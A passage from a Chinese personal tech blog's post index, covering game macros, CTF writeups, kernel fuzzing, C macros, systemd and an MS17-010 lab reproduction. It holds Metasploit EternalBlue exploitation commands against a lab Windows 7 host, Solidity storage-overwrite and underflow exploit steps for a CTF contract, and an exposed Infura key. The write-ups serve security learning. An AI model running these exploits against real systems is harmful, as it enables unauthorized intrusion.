\n然后就是为以下有重复行为的工作编写脚本：\n\n刷神秘店铺/珍珠店铺（已完成）\n合成极品太极八卦（已完成）\n合成极品花宴（未完成）\n强化装备（未完成）\n药园种植潜力草（已完成）\n刷28星宿（已完成）\n…\n\n以上脚本均开源：QGrain/zmxy-auto。实现思路嘛，简短来说就是”模拟”，再边用边查一些Q语言的语法就行了。\n一些思考：\n\n显示器分辨率的适配，我这些脚本的像素级匹配都是在2K分辨率的背景下做的，那适配1080P和4K呢？\n\n脚本后台化：目前脚本都是挂在前台进行的，也就是说挂机的同时不可操作电脑。即便可以在出去吃饭的时候使用或者拥有多台电脑时使用，依旧是有些不方便。但是脚本后台化简单查了一下写法，似乎有些麻烦和不稳定，所以有空再研究研究（已经摸鱼许久了orz）\n\n按键精灵还能用来干什么：在端游和页游领域里自然不用说，所有重复的工作都可以搬套。那么在日常学习和科研工作领域呢？也许这种模拟式的运维可以作为API式的运维的一种替代方案吧，在有GUI的前提下。\n\n","categories":["Diary"],"tags":["Game","QuickMacro"]},{"title":"NeSE丙组CTF月赛Writeup","url":"/2022/09/25/%E4%B8%99%E7%BB%84CTF%E6%9C%88%E8%B5%9Bwriteup/","content":"NeSE战队丙组月赛Writeup（包括解题和出题）\n\n🕊🕊🕊，之后的月赛writeup会更新在乙组CTF月赛writeup\n202209-蓝丙出题\n看到前几个月的丙组月赛里似乎没有出现过区块链相关的题目，正好最近有了解一些智能合约安全，故参考chainFlag出了(改了)两道入门级合约安全赛题\n\n1 EasyCheckin\n考察对智能合约、钱包账户、转账、以太坊事件等基础概念的理解\n难度：签到级\n\n题目搭建\ngit clone repo或者下载EasyCheckin.tar.gz\n配置config.py，设置infura token，port和flag：\n\n# Your need a infura ropsten key to go onINFURA_ROPSTEN_KEY = &quot;https://ropsten.infura.io/v3/YOUR_KEY&quot;EasyCheckin_PORT = 31040EasyCheckin_Flag = &quot;flag&#123;w0w_Y0u_hav3_ch3ck3d_1n&#125;&quot;\n\nbuild &amp; run 启动题目docker\n\nFROM ubuntu:18.04LABEL maintainer=&quot;zhangzhiyu1999@iie.ac.cn&quot;COPY ./*.py /ctf/COPY ./*.txt /ctf/COPY ./*.sol /ctf/# WORKDIR /ctfRUN sed -i &quot;s/archive.ubuntu.com/mirrors.aliyun.com/g&quot; /etc/apt/sources.list \\ &amp;&amp; apt update \\&amp;&amp; apt install -y python3 python3-pip \\&amp;&amp; mkdir -p ~/.pip \\&amp;&amp; echo &quot;&quot; &gt; ~/.pip/pip.conf \\&amp;&amp; echo &quot;[global]&quot; &gt;&gt; ~/.pip/pip.conf \\&amp;&amp; echo &quot;index-url = https://pypi.tuna.tsinghua.edu.cn/simple&quot; &gt;&gt; ~/.pip/pip.conf \\&amp;&amp; ln -s /usr/bin/python3 /usr/bin/python \\&amp;&amp; ln -s /usr/bin/pip3 /usr/bin/pip \\&amp;&amp; python -m pip install --upgrade pip \\&amp;&amp; pip install -r /ctf/requirements.txtCMD  cd /ctf &amp;&amp; python EasyCheckin_server.pyEXPOSE 31040# sudo docker build -t smartcontract:challenge1 -f ./Dockerfile .# sudo docker run -p 31040:31040 --name EasyCheckin -d smartcontract:challenge1\n解题过程\nnc服务器，选择 2 生成deployer账户，记住账户地址和私钥\n通过metamask已有账户向deployer转账0.001 ether用于部署题目，然后选择 3 部署题目合约，记住合约地址\n选择 1 复制源码，进入remix web IDE编译合约并在deploy页面通过At Address导入远程链上题目合约进行交互（或者通过etherscan打开题目合约并且上传源码，接入metamask之后，即可在etherscan进行交互）\n调用setCheckinStr函数写入Welcome to EasyCheckin，然后调用isCheckin触发pass事件\n\n\n\n最后提交触发pass事件的交易哈希，获得flag{w0w_Y0u_hav3_ch3ck3d_1n}\n\n\n2 RichOwners\n考察solidity语言基础、常见智能合约漏洞利用（storage覆盖，整数溢出等）\n难度：入门级\n\n题目搭建\ngit clone repo或者下载RichOwners.tar.gz\n配置config.py，设置infura token，port和flag：\n\n# Your need a infura ropsten key to go onINFURA_ROPSTEN_KEY = &quot;https://ropsten.infura.io/v3/1b670860e6e645fe9f85efd8f75a0e5a&quot;RichOwners_PORT = 31041RichOwners_Flag = &quot;flag&#123;St0rage_0verwrit3_and_1nt3ger_und3rfl0w&#125;&quot;\n\nbuild &amp; run 启动题目，同上EasyCheckin\n\nsudo docker build -t smartcontract:challenge2 -f ./Dockerfile .sudo docker run -p 31041:31041 --name RichOwners -d smartcontract:challenge2\n解题过程漏洞原理1 未初始化结构体对storage的覆盖\nSolidity语言的变量存储位置分为三种：storage，memory和calldata。storage存储在链上，类似与计算机的硬盘，对合约具备全局可见性；memory和calldata则是存储在临时的内存中，不上链。\nsolidity语言(低于0.4.25)的变量存储有一个特性，即数组、映射、结构体类型的局部变量默认是引用合约的storage，而全局变量默认按照声明顺序存储在storage中。因此，如果这些局部变量未被初始化，则它们将直接指向storage首部，修改未初始化的这些变量即可实现对全局变量覆盖写入。 \n\n\n\n\nStorage slot index\nVar\n\n\n\n\n0（ ⬅ 未初始化的hacker结构体默认指向这里）\nowner_1  （hacker.hackeraddress1 覆盖写入）\n\n\n1\nowner_2  （hacker.hackeraddress2 覆盖写入）\n\n\n2\nowner_3\n\n\n3\nowner_4\n\n\n…\n…\n\n\n\n\n2 整数下溢\n很简单，如uint(1-2)下溢\n3 以太坊钱包地址生成(碰撞尾部)\n通过这个网站(https://vanity-eth.tk/)可以实现哈希碰撞的钱包地址\n漏洞利用\nnc服务器，选择 2 生成deployer账户，记住账户地址和私钥\n通过metamask已有账户向deployer转账0.001 ether用于部署题目，然后选择 3 部署题目合约，记住合约地址\n通过https://vanity-eth.tk/生成碰撞尾部地址的钱包账户，记住地址和私钥，导入metamask，然后在[ropsten水龙头](https://faucet.egorfine.com/)向该地址领取10个ropsten test ether\n选择 1 复制源码，进入remix web IDE编译合约并在deploy页面通过At Address导入远程链上题目合约\n\n\n\n调用nothing函数，并且附带1 Finney(也即0.001 ether)的value，利用未初始化的结构体对storage首部的覆盖，使得owner_1被修改为了msg.sender，也即我们自己的账户\n\n\n\n同上理，调用nothing并附带1 ether，覆盖owner_2为msg.sender\n\n\n\n直接花 1 ether 买下owner_3所属权\n\n\n\n由于msg.sender的地址已经通过网站设计好碰撞了尾部，因此直接附带1 ether调用dead构造整数下溢，然后调用imRich函数买下owner_4\n\n\n\n最后调用payforflag函数生成GetFlag事件，并且可以看到合约将3.001 ether归还答题钱包，合 约余额清零\n\n复制payforflag的transaction hash，提交至nc服务器拿到flag{St0rage_0verwrit3_and_1nt3ger_und3rfl0w}\n\n\n","categories":["CTF"],"tags":["NeSE","Writeup"]},{"title":"内核Fuzz技巧与备忘","url":"/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/","content":"留个备忘录方便查看做kernel fuzzing中遇到的问题和解决技巧（持续更新中ing）\n\n1 常用脚本\n一键安装syzkaller\n\n#!/bin/bashset -e sudo apt updatesudo apt install -y debootstrap qemu qemu-kvmsudo apt install -y git make build-essential openssh-server bcsudo apt install -y libssl-dev libelf-devsudo apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-devpushd ~wget https://dl.google.com/go/go1.19.6.linux-amd64.tar.gztar -zxvf go1.19.6.linux-amd64.tar.gzecho &quot;export GOPATH=~/go&quot; &gt;&gt; ~/.bashrcecho &quot;export PATH=\\$GOPATH/bin:\\$PATH&quot; &gt;&gt; ~/.bashrcsource ~/.bashrcgit clone https://github.com/google/syzkaller.gitcd syzkallermake -jecho -e &quot;\\nDone!&quot;\n\n查看crashs目录结果\n\n#!/bin/bashset -ecrash_dir=$1dumb_mode=$2print_help() &#123;        echo -e &quot;Usage: ./get_result.sh /path/to/crashs_dir&quot;        exit 0&#125;# customized# $1=desc, $2=reprodumb_filter() &#123;        if [[ $2 -gt 0 ]]        then                echo 0        else                echo 1        fi&#125;if [[ ! -n &quot;$crash_dir&quot; ]]then        print_helpficnt=0for crash in `ls $crash_dir`do        desc=`cat $crash_dir/$crash/description`        syz_repro=`ls $crash_dir/$crash | grep &quot;repro.prog&quot; | wc -l`        c_repro=`ls $crash_dir/$crash | grep &quot;repro.cprog&quot; | wc -l`        repro=`echo &quot;$syz_repro + $c_repro&quot; | bc`        if [[ $repro -gt 0 ]]        then                cnt=`echo &quot;$cnt+1&quot; | bc`        fi        dumb_ret=$(dumb_filter &quot;$desc&quot; &quot;$repro&quot;)        if [[ $dumb_mode == &quot;dumb&quot; &amp;&amp; $dumb_ret -eq &quot;1&quot; ]]        then                continue        fi        echo -e &quot;\\n============= $crash =============&quot;        echo -e &quot;$desc&quot;        echo -e &quot;C Repro: $&#123;c_repro&#125;, Syz Repro: $&#123;syz_repro&#125;&quot;done\n\nTBD\n\n2 qemu内复现poc3 qemu+gdb调试内核通过qemu启动待调试的内核：./debug.sh\n# debug.sh# 基于syzkaller的create-image.sh，开启nokaslrKERNEL=../linux-6.1.12IMAGE=./stretch.imgqemu-system-x86_64 \\  -kernel $KERNEL/arch/x86/boot/bzImage \\  -append &quot;console=ttyS0 root=/dev/sda nokaslr slub_debug=P kmemleak=on&quot;\\  -hda $IMAGE \\  -net user,hostfwd=tcp::16112-:22 -net nic \\  -enable-kvm \\  -cpu host \\  -nographic \\  -serial mon:stdio \\  -m 1G \\  -s \\  -S \\  -smp 1 \\  -pidfile kernel.debug.pid \\  2&gt;&amp;1 | tee kernel.debug.log\n相关参数解释：\n\n-s：监听gdb 1234端口\n-S：启动后挂起，等待连接（optional）\n-nographic：不启动图形界面，与console=ttyS0组合使用，将调试信息输出到ttyS0\n\ngdb连接进行调试（我安装的是gdb 10.2，不存在部分博客中提到需要修改gdb源码再编译的问题）：\ngdb vmlinux --eval-command=&quot;target remote tcp::1234&quot;\n常用命令：\n\n下软件断点：b，下硬件断点：hb，删除第N个断点：delete N\n打印源码：l，打印内存：x（x/nfu addr”。含义为以f格式打印从addr开始的n个长度单元为u的内存值。如 x/16xw）\n查看堆栈：bt，步进：n，步入：s，继续运行：c\n\n详细调试技巧请见gdb调试内核技巧总结\nTrouble shooting\n\nCannot insert breakpoint 1. Cannot access memory at address 0xffffffff8610ae1b\n用硬件断点hbreak而不是软件断点break\n\n\n\n4 Troubleshooting内核编译\n遇到FATAL: modpost: vmlinux.o is truncated.\n\n  LD      vmlinux.o  OBJCOPY modules.builtin.modinfoobjcopy: warning: vmlinux.o has a corrupt section with a size (3b7bb65e) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (59e797c0) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (20ce7197) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (168af608) larger than the file size  GEN     modules.builtin  GEN     .vmlinux.objs  MODPOST Module.symversFATAL: modpost: vmlinux.o is truncated. sechdrs[i].sh_offset=370247648 &gt; sizeof(*hrd)=64make[2]: *** [scripts/Makefile.modpost:144: Module.symvers] Error 1make[1]: *** [/root/kernels/linux-6.5-rc3/Makefile:1984: modpost] Error 2\n\n原因可能是.config开启了某些较新的模块而编译器版本过低，建议升级编译器（gcc ≥ 12，clang ≥ 15）\n\n","categories":["Fuzz"],"tags":["Fuzz","Kernel"]},{"title":"各个平台和编译器预定义的宏","url":"/2019/11/14/%E5%90%84%E4%B8%AA%E5%B9%B3%E5%8F%B0%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8%E9%A2%84%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AE%8F/","content":"在跨平台编程中，通过宏来区分不同的平台是一种较为常见的方法。\n\n1 不同平台1.1 Windows#ifdef _WIN32    //is defined for windows (32-bit and 64-bit)    #ifdef _WIN64    //windows 64bits    #else    //define something for  windows (32-bit only)#endif//GUI App#ifdef _WINDOWS//CUI App#ifdef _CONSOLE//Windows Versions#ifdef WINVER // or #ifdef _WIN32_WINNT    #if (WINVER &gt;= 0x030a) //Windows 3.1 and above    #if (WINVER &gt;= 0x0400) //Windows 95/NT4.0 and above    #if (WINVER &gt;= 0x0410) //Windows 98 and above    #if (WINVER &gt;= 0x0500) //Windows Me/2000 and above    #if (WINVER &gt;= 0x0501) //Windows XP and above    #if (WINVER &gt;= 0x0600) //Windows Vista and above    #if (WINVER &gt;= 0x0601) //Windows 7 and above//DOS#ifdef __DOS__#ifdef __MSDOS__//Cygwin#ifdef __CYGWIN__\n1.2 Unix//UNIX#ifdef __unix#ifdef __unix__//Linux#ifdef __linux#ifdef __linux__//FreeBSD#ifdef __FreeBSD__//NetBSD#ifdef __NetBSD__\n1.3 MacOS &amp; iOS// Universal#ifdef __APPLE__    #include &quot;TargetConditionals.h&quot;    #if TARGET_IPHONE_SIMULATOR        // iOS Simulator    #elif TARGET_OS_IPHONE        // iOS device    #elif TARGET_OS_MAC        // Other kinds of Mac OS    #else        //Unknown Apple platform    #endif// Mac OS 9#ifdef Macintosh//Mac OS X#ifdef __APPLE__&amp;&amp;__MACH__\n1.4 Android#ifdef __ANDROID__    #if __ANDROID_API__ &gt;= 1 //Android Version &gt;= 1.0    #if __ANDROID_API__ &gt;= 5 //Android Version &gt;= 2.0    #if __ANDROID_API__ &gt;= 11 //Android Version &gt;= 3.0    #if __ANDROID_API__ &gt;= 1 //Android Version &gt;= 1.0    #if __ANDROID_API__ &gt;= 1 //Android Version &gt;= 1.0\n2 不同编译器2.1 GCC#ifdef __GNUC__    #if __GNUC__ &gt;= 3 //GCC-3.0 and above\n2.2 Visual C++#ifdef _MSC_VER (非VC编译器很多地方也有定义)    #if _MSC_VER &gt;= 1000 //MSVC++4.0 and above    #if _MSC_VER &gt;= 1100 //MSVC++5.0 and above    #if _MSC_VER &gt;= 1200 //MSVC++6.0 and above    #if _MSC_VER &gt;= 1300 //MSVC++7.0 and above    #if _MSC_VER &gt;= 1400 //MSVC++8.0 and above    #if _MSC_VER &gt;= 1500 //MSVC++9.0 (Visual Studio 2008) and above    #if _MSC_VER &gt;= 1600 //MSVC++10.0 (Visual Studio 2010) and above    #if _MSC_VER &gt;= 1700 //MSVC++11.0 (Visual Studio 2012) and above    #if _MSC_VER &gt;= 1800 //MSVC++12.0 (Visual Studio 2013) and above    #if _MSC_VER &gt;= 1900 //MSVC++14.0 (Visual Studio 2015) and above    #if _MSC_VER &gt;= 1910 //MSVC++14.1 (Visual Studio 2017) and above\n2.3 Borland C++#ifdef __BORLANDC__\n2.4 CLANG#ifdef \n3 其它todo\n","categories":["Tricks"],"tags":["C"]},{"title":"批量窗口管理工具screenctl","url":"/2023/01/26/%E6%89%B9%E9%87%8F%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7screenctl/","content":"自己写的一个批量管理linux screen的工具screenctl，支持批量创建删除，命令执行，Web UI管理等功能。（Collaborators wanted）\n\n好吧，Web UI 还没做出来。🤣\n1 安装\nINFO：\n\n项目开源：https://github.com/QGrain/screenctl/\nPypi主页：https://pypi.org/project/screenctl/\n\n\n安装\n\n\n# 安装screensudo apt install screen# 安装screenctl (刚上传pypi不久，可能其他源还没有更新)pip install screenctl -i https://pypi.org/simple\n\nscreenctl -h 查看帮助\n\nusage: screenctl [-h] [-c CONF] [-v] actionscreenctl 0.0.4, Controller for screenpositional arguments:  action                create, delete, stat, serveroptional arguments:  -h, --help            show this help message and exit  -c CONF, --conf CONF  path to configuration  -v, --verbose         show verbose output\n2 使用\n批量创建\n\n# 批量创建screen并按照指定配置文件执行一条命令（常用于Fuzz）screenctl create -c job.json# job.json示例如下: &#123;    &quot;screen_name1&quot;: &quot;echo \\&quot;name1\\&quot; &gt;&gt; name1.log&quot;,    &quot;screen_name2&quot;: &quot;timeout 12h /PATH/TO/afl-fuzz -i in -o out PROGRAM ARGS @@&quot;,    &quot;screen_name3&quot;: &quot;ping -c 100 baidu.com&quot;&#125;# 批量查看screen状态screenctl stat -c job.json\n\n批量删除\n\n# 批量删除job.json中的所有窗口screenctl delete -c job.json# TODO: 支持自定义删除\n\nWeb UI (TODO)，抽时间写 🕊🕊🕊\n\n# TODO: 启动Web UI来批量管理screen，界面类似于supervisor# 支持UI界面批量/单独操作screen的启动与删除，以及其中的执行命令和输出回显screenctl server -c job.json# 🕊咕子咕子\n3 实现原理批量管理模块调用screen罢了hhh\n# 创建screenscreen -dm NAME# 在screen中执行命令screen -x -S NAME -X stuff CMD# 删除screenscreen -r NAME -X quit\nTo be completed\n","categories":["Tools"],"tags":["DevOps","Tricks"]},{"title":"【渗透】MS17-010漏洞复现","url":"/2019/11/14/%E6%B8%97%E9%80%8F-MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"1 漏洞原理1.1 简介EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。\n从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的WannaCrypt，无文件的勒索软件UIWIX和SMB蠕虫EternalRocks。\n\n1.2 漏洞简析Eternalblue利用了3个不同的bug\n\n第一个是内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，由于错误地使用的WORD强制类型转换，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的缓冲区溢出。\n第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于后者调用的数据包是前者大小的2倍。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。\n一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。\n\n2 漏洞复现2.1 渗透Windows7 32-bit2.1.1 实验环境实验平台：\n\n带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601\nIP：192.168.188.136\n\n\nKali Linux，用于渗透\nIP：192.168.188.135\n\n\n\n实验配置：\nkali没有32位机器的渗透模块，我们需要做以下配置\n\n安装wine 32\n\n# root 权限dpkg --add-architecture i386apt-get updateapt-get install wine32\n\n拉取EternalBlue_Doublepulsar攻击模块\n\ngit clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit# 将模块拷贝到msf的相应目录cd Eternalblue-Doublepulsar-metasploitcp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/\n\n运行postgresql\n\nservice postgresql start\n2.1.2 信息搜集\nnmap扫描\n\n# root 权限namp -sS -sV -Pn 192.168.188.136\n\n发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析\n\n查看并使用辅助扫描模块测试目标是否可攻击\n\n# 运行msfconsole工具msfconsole# 搜索ms17-010相关模块，并采用辅助模块进行测试search ms17-010# 发现有一个ms17_010的扫描检测模块可用, useuse auxiliary/scanner/smb/smb_ms17_010\n\n# 设置RHOSTS项为192.168.188.136set RHOSTS 192.168.188.136# 运行该ms17_010检测模块run\n\n发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入\n2.1.3 开始渗透\n尝试攻击\n\n# 使用doublepulsar攻击模块use exploit/windows/smb/eternalblue_doublepulsar# 设置RHOST项为192.168.188.136set RHOST 192.168.188.136# 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致show options\n\n# 运行攻击模块run\n\n# 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)set PROCESSINJECT explorer.exe# 再次exploit，成功run\n\nmeterpreter是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读【渗透】meterpreter提权\n2.2 渗透Windows7 64-bit相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。\n前几个步骤基本和渗透32位机器一致\n2.2.1 信息搜集\nnmap扫描主机信息\nmsfconsole采用scanner模块扫描检测ms17-010漏洞\n\nuse auxiliary/scanner/smb/smb_ms17_010set RHOSTS 192.168.188.138 # Windows 7 x64show optionsrun\n\n2.2.2开始渗透\n方法一：采用msf自带的eternalblue攻击模块\n\nuse exploit/windows/smb/ms17_010_eternalblueset RHOST 192.168.188 138 # Windows 7 x64show optionsrun\n\n成功拿到目标机器的Shell\n\n方法二：采用github开源攻击模块DoublePulsar\n\n步骤和攻击32位机器一致，但是需要配置wine64和wine32共存\n","categories":["Security"],"tags":["CVE","Bug","Penetration"]},{"title":"攻防世界-MISC新手区-Writeup","url":"/2020/04/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MISC%E6%96%B0%E6%89%8B%E5%8C%BA-Writeup/","content":"XCTF线上练习网站攻防世界，MISC方向的新手区Writeup。第一次做CTF练习题，第一次写Writeup(/▽＼)\n\nthis_is_flag题目描述：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}\n题目分析：显然可能的选项只有两个：flag&#123;xxx&#125;和flag&#123;th1s_!s_a_d4m0_4la9&#125;\nflag&#123;th1s_!s_a_d4m0_4la9&#125;\n题目总结：作为新手区的第一题它还是很友好的，并借此告诉了我们以下两点：\n\nCTF的flag一般长这样: flag{xxx}，并要注意提交的格式\nCTF的flag往往就在你意想不到的地方\n\npdf题目描述：菜猫给了菜狗一张图，说图下面什么都没有。附件下载地址\n题目分析：顾题思意，菜猫说图下什么都没有，这是本题明面上的唯一线索，因此怀疑图片下藏有flag\n\n进入Aadobe Acrobat编辑模式，将图片挪开，即可得到flag\n通过pandoc将pdf转word也可以移开得到flag\n\n\n\nflag&#123;security_through_obscurity&#125;\n题目总结：正如flag里所说，隐晦的地方往往可能藏有答案，比如图片的下面，甚至是里面（后面会遇到）\n如来十三掌题目描述：菜狗为了打败菜猫，学了一套如来十三掌。附件下载地址\n题目分析：下载附件后发现是一个docx：\n\n这段蜜汁繁体字让人不由得联想到著名的“与佛论禅”：一个加解密网站:\n\n\n按普渡众生中的提示，在密文前加入佛曰：成功解密，得到以下加密字符串：\nMzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9\n仍然不是flag格式，怀疑仍需要解密，因此尝试常见的几种不需要密钥的加解密，此处联系题目提到的如来十三掌，因此尝试rot13解码：\nzmxhz3tizhnjamhia3ptbmzyzghidmnrawpuzhnrdmjramrzywj9\n最终通过base64解码得到flag：\nflag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;\n题目总结：\n\n吐血体验，正所谓“活久见”，做的题目多了，自然也熟练了\n也明白了MISC喜欢结合古典/现代加密方式去隐藏密钥，奇怪的知识增长了.jpg\n\ngive_you_flag题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。附件下载地址\n题目分析：下载的附件先尝试一下打开看看是否能得到什么信息，结果发现gif的最后一帧有一张二维码一闪而过，除非你是多年练就的神手速，不然是截不到的。\n因此得另寻他法，此处推荐一个隐写解析的强力工具StegSolve，通过Frame Browser功能轻松得到二维码：\n\n那么下一步的目的就很明确了，补齐二维码的定位标识。下载定位标识的图片，通过在线ps贴上去即可：\n\nflag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;\n题目总结：\n\n只要工具用得好，不愁flag没得找\n要想做好MISC，害的学好PS\n\n坚持60s题目描述：\n题目分析：\n题目总结：\ngifDone, to be completed\n掀桌子Done, to be completed\next3Done, to be completed\nsteganoDone, to be completed\nSimepleRARDone, to be completed\nbase64stegotodo\n功夫再高也怕菜刀todo\n","categories":["CTF"],"tags":["CTF","Writeup"]},{"title":"编写systemd服务脚本","url":"/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/","content":"编写systemd服务脚本如何编写systemd服务脚本来实现服务的自启动，启动，停止和重启管理\n\n1 背景介绍\nRHEL6/CentOS6采用/etc/init.d/xxx脚本进行服务管理，但是7+版本之后由init管理升级为了由systemd管理，相应地服务管理方式也变更为由systemctl管理的service\n\nRHEL7/CentOS7的/etc/rc.d/rc.local建议创建自己的systemd服务或udev规则来进行开机自启脚本管理，建议如下：\n\n\n#!/bin/bash# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES## It is highly advisable to create own systemd services or udev rules# to run scripts during boot instead of using this file.## In contrast to previous versions due to parallel execution during boot# this script will NOT be run after all other services.## Please note that you must run &#x27;chmod +x /etc/rc.d/rc.local&#x27; to ensure# that this script will be executed during boot.\n\n因此我们应该顺应时代(工具)的变迁，学习systemd的用法🐕\n\n\n2 服务脚本写法\nCentOS7的service脚本一般存放在/etc/systemd/, /usr/lib/systemd路径下，前者包含着多个*.target.wants如multi-user.target.wants等；而后者为安装软件生成service的目录，一般编写自己的service可以放在此目录下。目录下又有system和user之分：\n/usr/lib/systemd/system/，系统服务，开机不需要用户登录即可运行的服务\n/usr/lib/system/user/，用户服务，需要用户登录后才能运行的服务\n\n\n每一个服务脚本文件以.service结尾，由三个区块组成: [Unit], [Service]和[Install]，以下是一个编写样例：\n\n[Unit]   Description=test           # 简单描述服务After=network.target    # 描述服务类别，表示本服务需要在network服务启动后在启动Before=xxx.service      # 表示需要在某些服务启动之前启动，After和Before字段只涉及启动顺序，不涉及依赖关系。[Service] Type=forking             # 设置服务的启动方式User=USER                # 设置服务运行的用户Group=USER               # 设置服务运行的用户组WorkingDirectory=/PATH    # 设置服务运行的路径(cwd)KillMode=control-group  # 定义systemd如何停止服务Restart=no                # 定义服务进程退出后，systemd的重启方式，默认是不重启ExecStart=/start.sh        # 服务启动命令，命令需要绝对路径（采用sh脚本启动其他进程时Type须为forking）   [Install]   WantedBy=multi-user.target  # 多用户\n\n完成service脚本编写后，需要执行以下命令以重载生效：\n\n# 重新加载所有的systemd服务sudo systemctl daemon-reload# 管理服务 [使能开启启动|启动|停止|重启|查看状态]sudo systemctl [enable|start|stop|restart|status] xxx.service\n3 区块参数解释[Unit]区块：启动顺序与依赖关系服务描述：\n\nDescription：给出当前服务的简单描述\nDocumentation：给出文档位置\n\n启动顺序：\n\nAfter：定义xxx.service应该在哪些target或service服务之后启动\nBefore：定义xxx.service应该在哪些target或service服务之前启动\n\n依赖关系：\n\nWants：表示xxx.service与定义的服务存在“弱依赖”关系，即指定的服务启动失败或停止运行不影响xxx的允行\nRequires：则表示”强依赖”关系，即指定服务启动失败或异常退出，那么xxx也必须退出；反之xxx启动则指定服务也会启动\n\n[Service]区块：启动行为定义启动命令：\n\nEnvironmentFile：指定当前服务的环境参数文件(路径)，如EnviromentFile=-/etc/sysconfig/xxx，连词号表示抑制错误，即发生错误时，不影响其他命令的执行\nEnvironment：后面接多个不同的shell变量，如Environment=DATA_DIR=/dir/data\nUser：设置服务运行的用户\nGroup：设置服务运行的用户组\nWorkingDirectory：设置服务运行的路径\nExec*：各种与执行相关的命令\nExecStart：定义启动服务时执行的命令\nExecStop：定义停止服务时执行的命令 \nExecStartPre：定义启动服务前执行的命令 \nExecStartPost：定义启动服务后执行的命令\nExecStopPost：定义停止服务后执行的命令\nExecReload：定义重启服务时执行的命令 \n\n\n\n启动类型：\n\nType：字段定义启动类型，可以设置的值如下\nsimple（默认值）：ExecStart字段启动的进程为主进程，即直接启动服务进程\nforking：ExecStart字段将以fork()方式启动，此时父进程将会退出，子进程将成为主进程（例如用shell脚本启动服务进程）\noneshot：类似于simple，但只执行一次，Systemd 会等它执行完，才启动其他服务\ndbus：类似于simple，但会等待 D-Bus 信号后启动\nnotify：类似于simple，启动结束后会发出通知信号，然后 Systemd 再启动其他服务\nidle：类似于simple，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合\n\n\nRemainAfterExit：设为yes，表示进程退出以后，服务仍然保持执行\n\n重启行为：\n\nKillMode：定义 Systemd 如何停止服务，可以设置的值如下\ncontrol-group（default）：当前控制组里面的所有子进程，都会被杀掉\nprocess：只杀主进程\nmixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号\nnone：没有进程会被杀掉，只是执行服务的 stop 命令\n\n\nRestart：定义了服务退出后，Systemd 的重启方式，可以设置的值如下（对于守护进程，推荐设为on-failure。对于那些允许发生错误退出的服务，可以设为on-abnormal）\nno（default）：退出后不会重启\non-success：只有正常退出时（退出状态码为0），才会重启\non-failure：非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启\non-abnormal：只有被信号终止和超时，才会重启\non-abort：只有在收到没有捕捉到的信号终止时，才会重启\non-watchdog：超时退出，才会重启\nalways：不管是什么退出原因，总是重启\n\n\nRestartSec：表示 Systemd 重启服务之前，需要等待的秒数\n\n[Install]区块：服务安装定义\nWantedBy：表示该服务所在的 Target\n\nTarget的含义是服务组，如WantedBy=multi-user.target指的是该服务所属于multi-user.target。当执行systemctl enable xxx.service命令时，xxx.service的符号链接就会被创建在/etc/systemd/system/multi-user.target目录下。\n可以通过systemctl get-default命令查看系统默认启动的target，一般为multi-user或者是graphical。因此配置好相应的WantedBy字段，可以实现服务的开机启动。\n4 参考文章[1]【阮一峰的网络日志】Systemd 入门教程：实战篇\n[2]  Centos7 自定义systemctl服务脚本\n[3]  编写systemd下服务脚本\n[4]  systemd 